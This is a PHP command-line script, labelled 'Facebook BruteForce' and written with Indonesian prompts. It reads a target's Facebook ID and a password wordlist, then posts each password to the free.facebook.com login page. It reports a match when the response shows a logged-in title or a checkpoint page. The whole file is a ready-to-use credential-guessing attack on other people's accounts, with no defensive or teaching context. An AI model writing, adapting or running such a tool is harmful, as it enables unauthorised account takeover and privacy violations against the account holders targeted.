<?php
error_reporting(0);
/*
  * Facebook BruteForce
*/
function check($user, $pass) {
    $fileua = 'user-agents.txt';
    $useragent = $fileua[rand(0, count($fileua) - 1)];
    $kuki = 'kuki.txt';
    touch($kuki);
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://free.facebook.com/login.php');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass.'&login=Login');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $kuki);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $kuki);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_REFERER, 'https://free.facebook.com');
    $output = curl_exec($ch) or die('periksa koneksi internet anda
'.$url);
    if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
        return TRUE;
    } else {
        return FALSE;
    }
}
$nc="\e[0m";
$white="\e[1;37m";
$black="\e[0;30m";
$blue="\e[0;34m";
$light_blue="\e[1;34m";
$green="\e[0;32m";
$light_green="\e[1;32m";
$cyan="\e[0;36m";
$light_cyan="\e[1;36m";
$red="\e[0;31m";
$light_red="\e[1;31m";
$purple="\e[0;35m";
$light_purple="\e[1;35m";
$brown="\e[0;33m";
$yellow="\e[1;33m";
$gray="\e[0;30m";
$light_gray="\e[0;37m";
$error = $red."MASUKAN ID/DAN TEMPAT PASSWORD DENGAN BENAR\n".$nc;
$banner = $red."+-----------------------+
".$blue."|  Facebook Bruteforce  |
".$cyan."|    Author : Renaldy   |\n$red+-----------------------+\n\n".$nc;
$file = $_SERVER[argv][1];
echo "$red Ambil ID target dari browser\n$green ID Target :$blue ";
$user = trim(fgets(STDIN));
echo "$green Tempat password :$blue ";
$wordlist = trim(fgets(STDIN));
if(!empty($user) && !empty($wordlist)) {
    $passlist = file($wordlist);
    $passcount = count($passlist);
    print $banner;
    print "Checking ".$yellow.$passcount." password..\n".$nc;
    foreach($passlist as $password) {
        $pass = substr($password, 0, strlen($password) - 1);
        if(check(urlencode($user), urlencode($pass))) {
            print $pass." \033[7m\033[32m✅\033[27m ".$green."OK, 
Cocok\n".$nc;
        } else {
            print $pass." \033[7m\033[1;31m❌\033[27m ".$red."Gak Cocok\n".$nc;
        }
    }
} else {
    print $banner;
    print "
".$error."".$nc;
}
?>